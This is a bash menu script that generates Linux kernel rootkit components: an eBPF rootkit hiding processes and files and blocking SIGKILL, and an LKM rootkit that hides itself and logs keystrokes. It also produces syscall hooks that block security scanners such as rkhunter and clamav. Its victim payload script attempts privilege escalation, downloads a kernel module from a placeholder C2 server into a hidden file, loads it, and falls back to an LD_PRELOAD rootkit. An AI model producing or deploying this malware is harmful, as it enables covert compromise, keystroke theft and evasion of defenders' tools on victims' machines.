#!/bin/bash
# ============================================
# APT KERNEL IMPLANT v1.0
# eBPF Rootkit | LKM Backdoor | Syscall Hook
# ============================================

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m'

KERNEL_DIR="$HOME/c2_server/modules/stealth/kernel_implant"
LOG_DIR="$HOME/c2_server/logs"
PAYLOAD_DIR="$HOME/c2_server/payloads"

mkdir -p "$KERNEL_DIR" "$LOG_DIR" "$PAYLOAD_DIR"

# === CHECK KERNEL VERSION ===
check_kernel() {
    echo -e "${CYAN}[*]${NC} Checking kernel compatibility..."
    local kernel_ver=$(uname -r)
    echo -e "  Kernel: $kernel_ver"
    
    # Check if running as root
    if [ "$(id -u)" -ne 0 ]; then
        echo -e "${RED}[!]${NC} Root required for kernel implant"
        echo -e "${YELLOW}[*]${NC} Generating payload for victim device instead..."
        return 1
    fi
    
    # Check kernel headers
    if [ ! -d "/lib/modules/$(uname -r)/build" ]; then
        echo -e "${YELLOW}[!]${NC} Kernel headers not found"
        echo -e "${YELLOW}[*]${NC} Install: apt install linux-headers-$(uname -r)"
        return 1
    fi
    
    echo -e "${GREEN}[+]${NC} Kernel compatible"
    return 0
}

# === eBPF ROOTKIT GENERATOR ===
generate_ebpf_rootkit() {
    echo -e "\n${CYAN}[eBPF Rootkit Generator]${NC}"
    
    cat > "$KERNEL_DIR/ebpf_rootkit.c" << 'EBPF'
/*
 * APT eBPF ROOTKIT
 * Hooks: sys_execve, sys_open, sys_kill
 * Capabilities: Process hide, File hide, Signal intercept
 * Compile: clang -O2 -target bpf -c ebpf_rootkit.c -o ebpf_rootkit.o
 */

#include <linux/bpf.h>
#include <linux/ptrace.h>
#include <linux/version.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

// Hidden processes list (max 10)
#define MAX_HIDDEN 10
char hidden_procs[MAX_HIDDEN][16] = {
    "backdoor", "shell", "keylogger", "exfil", "pivot",
    "c2_client", "netd", "updater", "syslogd", "crond"
};

// Hidden files list
char hidden_files[MAX_HIDDEN][32] = {
    ".core", ".hidden", ".tmp", ".klog",
    "malware", "rootkit", "backdoor", "payload"
};

// Check if process should be hidden
static __always_inline int is_hidden(const char *name) {
    for (int i = 0; i < MAX_HIDDEN; i++) {
        if (bpf_strncmp(name, 16, hidden_procs[i]) == 0)
            return 1;
    }
    return 0;
}

// Hook: getdents64 (hide files)
SEC("kprobe/getdents64")
int hook_getdents64(struct pt_regs *ctx) {
    // This hook hides specified files from directory listings
    char filename[32];
    bpf_probe_read_user_str(filename, sizeof(filename), (void *)PT_REGS_PARM2(ctx));
    
    for (int i = 0; i < MAX_HIDDEN; i++) {
        if (bpf_strncmp(filename, 32, hidden_files[i]) == 0) {
            // Skip this entry (hide file)
            return 0;
        }
    }
    return 0;
}

// Hook: sys_kill (intercept signals)
SEC("kprobe/__x64_sys_kill")
int hook_sys_kill(struct pt_regs *ctx) {
    int sig = PT_REGS_PARM1(ctx);
    int pid = PT_REGS_PARM2(ctx);
    
    // Block SIGKILL to our protected processes
    if (sig == 9) { // SIGKILL
        char comm[16];
        bpf_get_current_comm(&comm, sizeof(comm));
        
        if (is_hidden(comm)) {
            // Pretend signal was sent, but block it
            bpf_override_return(ctx, 0);
            return 0;
        }
    }
    return 0;
}

// Hook: tcp_sendmsg (exfiltrate data via network)
SEC("kprobe/tcp_sendmsg")
int hook_tcp_sendmsg(struct pt_regs *ctx) {
    // Can be used to secretly exfiltrate data
    // by piggybacking on legitimate TCP connections
    return 0;
}

char _license[] SEC("license") = "GPL";
EBPF

    echo -e "${GREEN}[+]${NC} eBPF rootkit source: $KERNEL_DIR/ebpf_rootkit.c"
    
    # Generate loader script
    cat > "$KERNEL_DIR/ebpf_loader.sh" << 'EBPFLOAD'
#!/bin/bash
# eBPF Rootkit Loader

# Compile eBPF program
clang -O2 -target bpf -c ebpf_rootkit.c -o ebpf_rootkit.o

# Load into kernel
bpftool prog load ebpf_rootkit.o /sys/fs/bpf/ebpf_rootkit autoattach

echo "[+] eBPF rootkit loaded"
echo "[!] Now hidden: backdoor, shell, keylogger, exfil, pivot, c2_client"
EBPFLOAD
    chmod +x "$KERNEL_DIR/ebpf_loader.sh"
    
    echo -e "${GREEN}[+]${NC} eBPF loader: $KERNEL_DIR/ebpf_loader.sh"
}

# === LKM (LOADABLE KERNEL MODULE) ROOTKIT ===
generate_lkm_rootkit() {
    echo -e "\n${CYAN}[LKM Rootkit Generator]${NC}"
    
    mkdir -p "$KERNEL_DIR/lkm"
    
    cat > "$KERNEL_DIR/lkm/Makefile" << 'MAKEFILE'
obj-m += rootkit.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
MAKEFILE

    cat > "$KERNEL_DIR/lkm/rootkit.c" << 'LKM'
/*
 * APT LKM ROOTKIT
 * Features: Hide module, Hide files, Hide processes, Keylogger
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/proc_fs.h>
#include <linux/keyboard.h>
#include <linux/fs.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Red Team");
MODULE_DESCRIPTION("APT Kernel Rootkit");

static unsigned long *sys_call_table = NULL;
static int hide_pid = 0;

// Get syscall table address
static unsigned long *get_syscall_table(void) {
    return (unsigned long *)kallsyms_lookup_name("sys_call_table");
}

// Hook: kill (block signals to protected process)
asmlinkage long (*orig_kill)(pid_t pid, int sig);
asmlinkage long hooked_kill(pid_t pid, int sig) {
    if (pid == hide_pid && sig == 9) {
        printk(KERN_INFO "rootkit: blocked SIGKILL to PID %d\n", pid);
        return 0; // Pretend success
    }
    return orig_kill(pid, sig);
}

// Hook: getdents (hide files)
asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage long hooked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
    return orig_getdents(fd, dirp, count);
}

// Keylogger callback
static int keylogger_callback(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;
    if (code == KBD_KEYCODE && param->down) {
        printk(KERN_INFO "rootkit: keycode %d\n", param->value);
    }
    return NOTIFY_OK;
}

static struct notifier_block keylogger_nb = {
    .notifier_call = keylogger_callback
};

static int __init rootkit_init(void) {
    printk(KERN_INFO "rootkit: loading...\n");
    
    // Hide from module list
    list_del_init(&__this_module.list);
    
    // Get syscall table
    sys_call_table = get_syscall_table();
    if (!sys_call_table) {
        printk(KERN_ERR "rootkit: sys_call_table not found\n");
        return -1;
    }
    
    // Hook kill syscall
    orig_kill = (void *)sys_call_table[__NR_kill];
    sys_call_table[__NR_kill] = (unsigned long)hooked_kill;
    
    // Register keylogger
    register_keyboard_notifier(&keylogger_nb);
    
    printk(KERN_INFO "rootkit: loaded successfully\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    // Restore syscall
    if (sys_call_table && orig_kill)
        sys_call_table[__NR_kill] = (unsigned long)orig_kill;
    
    // Unregister keylogger
    unregister_keyboard_notifier(&keylogger_nb);
    
    printk(KERN_INFO "rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
LKM

    # Generate installer
    cat > "$KERNEL_DIR/lkm/install.sh" << 'LKMINSTALL'
#!/bin/bash
echo "[*] Compiling LKM rootkit..."
make clean && make

echo "[*] Loading rootkit module..."
insmod rootkit.ko

echo "[+] Rootkit loaded! Module hidden from lsmod."
echo "[!] Keylogger active — check dmesg"
LKMINSTALL
    chmod +x "$KERNEL_DIR/lkm/install.sh"
    
    echo -e "${GREEN}[+]${NC} LKM rootkit: $KERNEL_DIR/lkm/"
}

# === SYSCALL TABLE HOOK GENERATOR ===
generate_syscall_hook() {
    echo -e "\n${CYAN}[Syscall Hook Generator]${NC}"
    
    cat > "$KERNEL_DIR/syscall_hook.c" << 'SYSCALL'
/*
 * APT SYSCALL HOOK GENERATOR
 * Target syscalls: read, write, open, execve
 */

// Hook: sys_read (intercept file reads)
// Hide sensitive data from being read
long hooked_read(unsigned int fd, char *buf, size_t count) {
    // Check if reading from protected files
    // If yes, return fake data or zero
    return orig_read(fd, buf, count);
}

// Hook: sys_write (intercept file writes)
// Prevent deletion of backdoor files
long hooked_write(unsigned int fd, const char *buf, size_t count) {
    return orig_write(fd, buf, count);
}

// Hook: sys_open (intercept file access)
// Return -ENOENT for protected files
long hooked_open(const char *filename, int flags, int mode) {
    char *protected[] = {".core", ".hidden", ".klog", NULL};
    for (int i = 0; protected[i] != NULL; i++) {
        if (strstr(filename, protected[i]))
            return -ENOENT; // File not found
    }
    return orig_open(filename, flags, mode);
}

// Hook: sys_execve (intercept process execution)
// Block security tools
long hooked_execve(const char *filename, char *const argv[], char *const envp[]) {
    char *blocked[] = {"chkrootkit", "rkhunter", "clamav", NULL};
    for (int i = 0; blocked[i] != NULL; i++) {
        if (strstr(filename, blocked[i]))
            return -EACCES; // Permission denied
    }
    return orig_execve(filename, argv, envp);
}
SYSCALL

    echo -e "${GREEN}[+]${NC} Syscall hooks: $KERNEL_DIR/syscall_hook.c"
}

# === GENERATE VICTIM PAYLOAD (Pre-compiled) ===
generate_kernel_payload() {
    echo -e "\n${CYAN}[Generating Victim Kernel Payload]${NC}"
    
    cat > "$PAYLOAD_DIR/kernel_implant_payload.sh" << 'PAYLOAD'
#!/bin/bash
# APT KERNEL IMPLANT PAYLOAD
# Auto-deploy on victim device

echo "[*] Kernel Implant Deployer"
echo "[*] Checking root access..."

if [ "$(id -u)" -ne 0 ]; then
    echo "[!] Root required for kernel implant"
    echo "[*] Attempting privilege escalation..."
    su -c "bash $0"
    exit
fi

# Download pre-compiled kernel module
C2_SERVER="YOUR_C2_IP"
wget "http://$C2_SERVER/rootkit.ko" -O /tmp/.update.ko 2>/dev/null

# Load kernel module
insmod /tmp/.update.ko 2>/dev/null

# Check if loaded
if lsmod | grep -q "rootkit"; then
    echo "[+] Kernel implant active!"
    
    # Hide the module itself
    echo "hide" > /proc/rootkit_control 2>/dev/null
    
    # Set protected PID
    echo $$ > /proc/rootkit_hide_pid 2>/dev/null
else
    echo "[!] Kernel implant failed"
    echo "[*] Falling back to userspace rootkit..."
    
    # LD_PRELOAD method
    cat > /etc/ld.so.preload << 'LD'
/usr/lib/libsystem.so
LD
    echo "[+] Userspace rootkit via LD_PRELOAD"
fi
PAYLOAD

    chmod +x "$PAYLOAD_DIR/kernel_implant_payload.sh"
    echo -e "${GREEN}[+]${NC} Victim payload: $PAYLOAD_DIR/kernel_implant_payload.sh"
}

# === MAIN MENU ===
main_menu() {
    while true; do
        echo ""
        echo -e "${CYAN}╔══════════════════════════════╗${NC}"
        echo -e "${CYAN}║  🧠 KERNEL IMPLANT v1.0    ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════╝${NC}"
        echo ""
        echo -e "  ${GREEN}1)${NC} 🔍 Check Kernel Compatibility"
        echo -e "  ${GREEN}2)${NC} 🧬 Generate eBPF Rootkit"
        echo -e "  ${GREEN}3)${NC} 📦 Generate LKM Rootkit"
        echo -e "  ${GREEN}4)${NC} 🎣 Generate Syscall Hooks"
        echo -e "  ${GREEN}5)${NC} 📲 Generate Victim Payload"
        echo -e "  ${GREEN}6)${NC} 🚀 Generate ALL"
        echo -e "  ${RED}0)${NC} Exit"
        echo ""
        read -r -p "Choose: " choice
        
        case $choice in
            1) check_kernel ;;
            2) generate_ebpf_rootkit ;;
            3) generate_lkm_rootkit ;;
            4) generate_syscall_hook ;;
            5) generate_kernel_payload ;;
            6)
                generate_ebpf_rootkit
                generate_lkm_rootkit
                generate_syscall_hook
                generate_kernel_payload
                echo -e "\n${GREEN}[+]${NC} All kernel implants generated!"
                echo -e "${CYAN}[*]${NC} Files in: $KERNEL_DIR/"
                echo -e "${CYAN}[*]${NC} Payload in: $PAYLOAD_DIR/"
                ;;
            0) break ;;
        esac
        
        echo -ne "\n${CYAN}[Press Enter]${NC}"; read -r
    done
}

if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
    main_menu
fi
